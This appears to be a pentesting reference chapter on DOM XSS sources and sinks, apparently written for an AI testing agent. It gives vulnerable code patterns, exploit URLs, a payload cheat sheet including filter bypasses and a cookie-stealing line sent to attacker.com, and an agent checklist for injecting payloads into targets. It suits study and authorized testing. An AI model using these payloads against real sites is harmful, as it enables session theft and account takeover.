# 09 - DOM XSS: Sources & Sinks

## Overview

DOM-based Cross-Site Scripting (DOM XSS) occurs entirely within the browser when JavaScript reads data from an attacker-controllable **source** and passes it to a dangerous **sink** that supports dynamic code execution or HTML injection. Unlike reflected or stored XSS, the malicious payload never reaches the server -- the vulnerability exists entirely in client-side code.

**References:**
- [PortSwigger - DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [OWASP - DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
- [HackTricks - DOM XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss)
- [Intigriti - Hunting for DOM-based XSS](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-dom-based-xss-vulnerabilities)

---

## 1. DOM XSS Sources -- Complete Catalog

A **source** is any JavaScript property or API that returns data an attacker can control. The following is an exhaustive catalog organized by category.

### 1.1 URL-Based Sources

These are the most common and most exploitable sources because attackers can craft malicious URLs distributed to victims.

| Source | Description | Encoding Behavior |
|--------|-------------|-------------------|
| `document.URL` | Full URL as string | Not decoded |
| `document.documentURI` | Full URI of document | Not decoded |
| `document.baseURI` | Base URL of document | Not decoded |
| `location.href` | Full URL including fragment | Browser-dependent |
| `location.hash` | Fragment identifier (#...) | Not percent-decoded in most browsers |
| `location.search` | Query string (?...) | Not decoded |
| `location.pathname` | URL path component | Partially encoded |
| `location.host` / `location.hostname` | Host portion | Rarely attacker-controlled (open redirects) |
| `location.protocol` | Protocol scheme | Rarely useful |
| `window.location` (toString) | Full URL string | Same as location.href |
| `document.location` | Alias for window.location | Same as above |
| `URL` / `URLSearchParams` API | `new URL(location).searchParams.get('q')` | Decoded by API |

**Vulnerable Pattern -- URL source:**
```javascript
// VULNERABLE: Reads hash directly into processing
var userInput = document.location.hash.substring(1);
document.getElementById('output').innerHTML = userInput;

// VULNERABLE: URL parameter extraction without sanitization
var params = new URLSearchParams(window.location.search);
var name = params.get('name');
document.write('<h1>Welcome, ' + name + '</h1>');
```

### 1.2 Navigation & Referrer Sources

| Source | Description |
|--------|-------------|
| `document.referrer` | URL of the referring page |
| `history.pushState` / `history.replaceState` | State objects can carry data |
| `document.URL` after pushState | Reflects modified URL |

**Vulnerable Pattern -- Referrer source:**
```javascript
// VULNERABLE: Referrer injected into DOM
var ref = document.referrer;
document.getElementById('back-link').innerHTML = '<a href="' + ref + '">Go Back</a>';
```

### 1.3 Browser Storage Sources

| Source | Description |
|--------|-------------|
| `document.cookie` | All cookies as key=value string |
| `localStorage.getItem()` | Persistent key-value storage |
| `sessionStorage.getItem()` | Session-scoped key-value storage |
| `IndexedDB` (via IDBRequest) | Structured client-side database |

**Vulnerable Pattern -- Storage source:**
```javascript
// VULNERABLE: Stored data rendered without sanitization
var savedName = localStorage.getItem('username');
document.getElementById('greeting').innerHTML = 'Hello, ' + savedName;

// Attack: First poison localStorage, then trigger rendering
// localStorage.setItem('username', '<img src=x onerror=alert(document.domain)>');
```

### 1.4 Cross-Window Communication Sources

| Source | Description |
|--------|-------------|
| `window.name` | Persists across navigations, attacker-settable |
| `postMessage` event `event.data` | Cross-origin message data |
| `MessageChannel` / `BroadcastChannel` | Inter-context messaging |

**Vulnerable Pattern -- window.name source:**
```javascript
// VULNERABLE: window.name is attacker-controllable
var config = window.name;
document.getElementById('content').innerHTML = config;

// Attack from attacker's page:
// <script>window.name='<img src=x onerror=alert(1)>';location='https://victim.com/page';</script>
```

### 1.5 Form & User Interaction Sources

| Source | Description |
|--------|-------------|
| `element.value` (input, textarea, select) | User-typed or pre-filled form data |
| `element.textContent` / `element.innerText` | Text content of elements |
| `FileReader` API results | Content of user-uploaded files |
| `Drag and Drop` event data | `event.dataTransfer.getData()` |
| `Clipboard API` | `navigator.clipboard.readText()` |

---

## 2. DOM XSS Sinks -- HTML Injection

These sinks parse their input as HTML, enabling injection of arbitrary elements including script tags and event handlers.

### 2.1 Core DOM HTML Sinks

| Sink | Danger Level | Context |
|------|-------------|---------|
| `element.innerHTML` | **Critical** | Parses full HTML, executes event handlers |
| `element.outerHTML` | **Critical** | Replaces element entirely with parsed HTML |
| `document.write()` | **Critical** | Writes to document stream, parses HTML |
| `document.writeln()` | **Critical** | Same as write() with newline |
| `element.insertAdjacentHTML()` | **Critical** | Parses HTML at specified position |
| `DOMParser.parseFromString()` | **Medium** | Parses HTML but in isolated document |
| `Range.createContextualFragment()` | **Critical** | Creates fragment from HTML string |

**Vulnerable Pattern -- innerHTML sink:**
```javascript
// VULNERABLE: Classic source-to-sink
var search = new URLSearchParams(location.search).get('q');
document.getElementById('results').innerHTML = 'Results for: ' + search;

// Exploit URL: https://target.com/search?q=<img src=x onerror=alert(document.cookie)>
```

**Vulnerable Pattern -- document.write sink:**
```javascript
// VULNERABLE: document.write with URL data
document.write('<script src="' + document.location.hash.substring(1) + '"><\/script>');

// Exploit URL: https://target.com/page#" onload="alert(1)" data-x="
```

### 2.2 jQuery HTML Sinks

jQuery methods that parse HTML are extremely common DOM XSS sinks, particularly in legacy applications.

| Sink | Danger Level | Notes |
|------|-------------|-------|
| `$(htmlString)` | **Critical** | jQuery constructor parses HTML if string starts with `<` |
| `.html(htmlString)` | **Critical** | Equivalent to innerHTML |
| `.append(htmlString)` | **Critical** | Parses and appends HTML |
| `.prepend(htmlString)` | **Critical** | Parses and prepends HTML |
| `.after(htmlString)` | **Critical** | Inserts parsed HTML after element |
| `.before(htmlString)` | **Critical** | Inserts parsed HTML before element |
| `.replaceWith(htmlString)` | **Critical** | Replaces element with parsed HTML |
| `.wrapAll(htmlString)` | **High** | Wraps matched elements with parsed HTML |

**Vulnerable Pattern -- jQuery $() sink:**
```javascript
// VULNERABLE: jQuery selector with location.hash (CVE in jQuery < 1.6.3)
$(window).on('hashchange', function() {
    var element = $(location.hash); // If hash contains HTML, it's parsed
    element.get(0).scrollIntoView();
});

// Exploit: https://target.com/page#<img src=x onerror=alert(1)>
```

**Reference:** [jQuery Bug #9521 - XSS with $(location.hash)](https://bugs.jquery.com/ticket/9521/)

---

## 3. DOM XSS Sinks -- JavaScript Execution

These sinks directly execute JavaScript code provided as strings.

| Sink | Danger Level | Context |
|------|-------------|---------|
| `eval(code)` | **Critical** | Direct code execution |
| `Function(code)()` | **Critical** | Creates and executes function from string |
| `setTimeout(code, ms)` | **Critical** | Executes string argument as code |
| `setInterval(code, ms)` | **Critical** | Executes string argument as code (repeating) |
| `setImmediate(code)` | **Critical** | IE-specific immediate execution |
| `execScript(code)` | **Critical** | IE-specific code execution (deprecated) |
| `script.text = code` | **Critical** | Sets script content for execution |
| `script.textContent = code` | **Critical** | Same as above |
| `script.src = url` | **Critical** | Loads and executes external script |
| `msSetImmediate(code)` | **High** | Microsoft-prefixed variant |
| `crypto.generateCRMFRequest()` | **Medium** | Firefox-specific, legacy |

**Vulnerable Pattern -- eval sink:**
```javascript
// VULNERABLE: User input flows to eval
var data = decodeURIComponent(location.search.substring(1));
var config = JSON.parse(data); // This would be safe
// But imagine: eval('(' + data + ')'); // This is the vulnerable pattern

// Exploit URL: https://target.com/app?alert(document.cookie))//
```

**Vulnerable Pattern -- setTimeout string sink:**
```javascript
// VULNERABLE: setTimeout with string argument from URL
var action = new URLSearchParams(location.search).get('action');
setTimeout("performAction('" + action + "')", 1000);

// Exploit: ?action=');alert(document.cookie);//
```

---

## 4. DOM XSS Sinks -- URL-Based

These sinks cause navigation or resource loading, enabling `javascript:` protocol execution.

| Sink | Danger Level | Context |
|------|-------------|---------|
| `location.href = url` | **Critical** | Navigates, executes javascript: URLs |
| `location.assign(url)` | **Critical** | Same as href assignment |
| `location.replace(url)` | **Critical** | Same, no history entry |
| `window.open(url)` | **Critical** | Opens URL, executes javascript: |
| `element.src = url` (img, iframe, script, embed, object) | **Critical** | Loads resource, javascript: in some contexts |
| `anchor.href = url` | **High** | Executes javascript: on click |
| `form.action = url` | **High** | Submits to javascript: URL |
| `iframe.src = url` | **Critical** | Loads content, javascript: in older browsers |
| `iframe.srcdoc = html` | **Critical** | Renders arbitrary HTML |
| `object.data = url` | **High** | Loads resource |
| `embed.src = url` | **High** | Loads resource |

**Vulnerable Pattern -- location.href sink:**
```javascript
// VULNERABLE: Redirect from URL parameter
var redirect = new URLSearchParams(location.search).get('redirect');
location.href = redirect;

// Exploit: ?redirect=javascript:alert(document.cookie)
```

**Vulnerable Pattern -- anchor href sink:**
```javascript
// VULNERABLE: Dynamic link generation
var url = new URLSearchParams(location.search).get('url');
document.getElementById('link').href = url;

// Exploit: ?url=javascript:alert(document.domain)
```

---

## 5. DOM XSS Sinks -- Other Dangerous APIs

### 5.1 Attribute Manipulation Sinks

| Sink | Context |
|------|---------|
| `element.setAttribute('onclick', code)` | Sets event handler attribute |
| `element.setAttribute('onmouseover', code)` | Any on* event attribute |
| `element.setAttribute('href', url)` | javascript: protocol risk |
| `element.setAttribute('src', url)` | Resource loading |
| `element.setAttribute('style', css)` | CSS injection (limited XSS) |
| `element.setAttributeNS()` | Namespace-aware variant |

### 5.2 CSS & Style Sinks

| Sink | Context |
|------|---------|
| `element.style.cssText = css` | Full CSS injection |
| `element.style.setProperty()` | Individual CSS property |
| `<style>` element injection | CSS-based data exfiltration |

### 5.3 Miscellaneous Sinks

| Sink | Context |
|------|---------|
| `document.domain = value` | Relaxes same-origin policy |
| `postMessage(data, origin)` | Sends data cross-origin (secondary) |
| `Blob URL / createObjectURL()` | Creates executable content URLs |
| `Worker()` / `SharedWorker()` | Executes script in worker context |
| `ServiceWorker.register()` | Registers persistent worker |
| `import()` | Dynamic module import |
| `Trusted Types` bypass via policy | If a permissive policy exists |

**Vulnerable Pattern -- Blob URL sink:**
```javascript
// VULNERABLE: User-controlled content in Blob
var content = new URLSearchParams(location.search).get('data');
var blob = new Blob([content], {type: 'text/html'});
var url = URL.createObjectURL(blob);
window.open(url);

// Exploit: ?data=<script>alert(document.domain)<\/script>
```

---

## 6. Source-to-Sink Tracing Methodology

### 6.1 Manual DevTools Tracing

**Step-by-step procedure using Chrome DevTools:**

1. **Identify potential sources:** Open DevTools (F12) > Sources tab > use `Ctrl+Shift+F` to search all scripts for source keywords:
   ```
   location.hash|location.search|location.href|document.URL|document.referrer|
   window.name|localStorage|sessionStorage|postMessage|document.cookie
   ```

2. **Set breakpoints on sources:** Add breakpoints where source values are read.

3. **Inject canary values:** Navigate to the page with a distinctive canary string in sources:
   ```
   https://target.com/page?q=CANARY12345#CANARY12345
   ```

4. **Trace data flow:** Step through code with F10/F11, watching how canary propagates through variables, function calls, and transformations.

5. **Monitor sinks:** Set breakpoints on known sink functions. In Console, override dangerous sinks to detect when they are called:
   ```javascript
   // Monitor innerHTML assignments
   var originalSet = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML').set;
   Object.defineProperty(Element.prototype, 'innerHTML', {
       set: function(value) {
           if (value && value.toString().includes('CANARY12345')) {
               console.trace('innerHTML sink reached with canary!');
               debugger;
           }
           return originalSet.call(this, value);
       }
   });
   ```

6. **Verify exploitability:** Replace canary with actual XSS payload and confirm execution.

**Reference:** [PortSwigger - Testing for DOM XSS with DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/dom-xss)

### 6.2 Automated Analysis Tools

| Tool | Type | Description |
|------|------|-------------|
| **Burp DOM Invader** | Dynamic | Injects canary, traces sources to sinks automatically |
| **Semgrep** | Static (SAST) | Rules for DOM XSS source-sink patterns |
| **ESLint security plugins** | Static | `eslint-plugin-no-unsanitized` detects unsafe sinks |
| **DOM XSS Scanner (Acunetix)** | Dynamic (DAST) | Automated crawl + DOM XSS detection |
| **taint-chrome** | Dynamic | Chrome extension for taint tracking |
| **purl / retire.js** | Library audit | Identifies vulnerable JS libraries with known DOM XSS |

### 6.3 Static Analysis Grep Patterns

Search codebase for high-probability DOM XSS patterns:

```bash
# Find HTML injection sinks with potential sources
grep -rn "\.innerHTML\s*=" --include="*.js" --include="*.ts"
grep -rn "document\.write" --include="*.js" --include="*.ts"
grep -rn "\.insertAdjacentHTML" --include="*.js" --include="*.ts"
grep -rn "\.html\s*(" --include="*.js" --include="*.ts"  # jQuery .html()
grep -rn "location\.\(hash\|search\|href\)" --include="*.js" --include="*.ts"
grep -rn "bypassSecurityTrust" --include="*.ts"  # Angular bypasses
grep -rn "dangerouslySetInnerHTML" --include="*.jsx" --include="*.tsx"
grep -rn "v-html" --include="*.vue"
```

---

## 7. DOM XSS Payloads

### 7.1 HTML Injection Sink Payloads (innerHTML, document.write, jQuery .html())

```
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<svg/onload=alert(document.domain)>
<body onload=alert(document.domain)>
<video src=x onerror=alert(document.domain)>
<audio src=x onerror=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<marquee onstart=alert(document.domain)>
<input onfocus=alert(document.domain) autofocus>
<select onfocus=alert(document.domain) autofocus>
<textarea onfocus=alert(document.domain) autofocus>
<keygen onfocus=alert(document.domain) autofocus>
<meter onmouseover=alert(document.domain)>0</meter>
```

### 7.2 JavaScript Execution Sink Payloads (for eval, setTimeout, Function)

```
alert(document.domain)
';alert(document.domain);//
");alert(document.domain);//
});alert(document.domain);//
1;alert(document.domain)
[].constructor.constructor('alert(document.domain)')()
```

### 7.3 URL-Based Sink Payloads (location.href, window.open, anchor.href)

```
javascript:alert(document.domain)
javascript:alert(document.domain)//
javascript:void(document.location='https://attacker.com/?c='+document.cookie)
data:text/html,<script>alert(document.domain)<\/script>
data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
```

### 7.4 Encoding Bypass Payloads

```html
<!-- URL encoding -->
<img src=x onerror=alert%28document.domain%29>

<!-- HTML entity encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Unicode escapes in JS context -->
\u0061\u006c\u0065\u0072\u0074(document.domain)

<!-- Base64 via atob -->
<img src=x onerror="window[atob('YWxlcnQ=')](document.domain)">

<!-- Tagged template strings -->
<img src=x onerror=alert`document.domain`>

<!-- Constructor chain -->
<img src=x onerror="[].find.constructor('alert(document.domain)')()">
```

### 7.5 DOM Clobbering Payloads

```html
<!-- Clobber document.getElementById -->
<form id=x><input name=y value="clobbered"></form>
<!-- Now document.getElementById('x').y.value === "clobbered" -->

<!-- Clobber named properties -->
<a id=config href="javascript:alert(1)">
<!-- Now window.config.href === "javascript:alert(1)" -->

<!-- Clobber with anchors for toString -->
<a id=defaultConfig>
<a id=defaultConfig name=url href="javascript:alert(1)">
```

### 7.6 Advanced Filter Bypass Payloads

```html
<!-- Event without parentheses -->
<img src=x onerror=alert&#40;1&#41;>

<!-- SVG namespace confusion -->
<svg><script>alert&#40;1&#41;</script></svg>

<!-- Using location object to avoid blocked words -->
<img src=x onerror=location='javas'+'cript:ale'+'rt(1)'>

<!-- Using top-level await (modern browsers) -->
<img src=x onerror="import('data:text/javascript,alert(1)')">

<!-- Mutation XSS (mXSS) -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

**Reference:** [PortSwigger XSS Cheat Sheet - 2026 Edition](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

---

## 8. Testing Checklist for AI Agent

1. Enumerate all JavaScript files loaded by the target page.
2. Search each file for all known sources (Section 1).
3. For each source found, trace data flow to identify if it reaches a sink (Sections 2-5).
4. Identify any sanitization or encoding applied between source and sink.
5. Test bypass of each sanitization function encountered.
6. Inject canary values via each source and monitor DOM for sink execution.
7. Replace canary with appropriate payload from Section 7 based on sink type.
8. Verify payload execution in target browser context.
9. Document the full source-to-sink data flow chain for each finding.
10. Assess impact: cookie theft, session hijacking, keylogging, phishing.
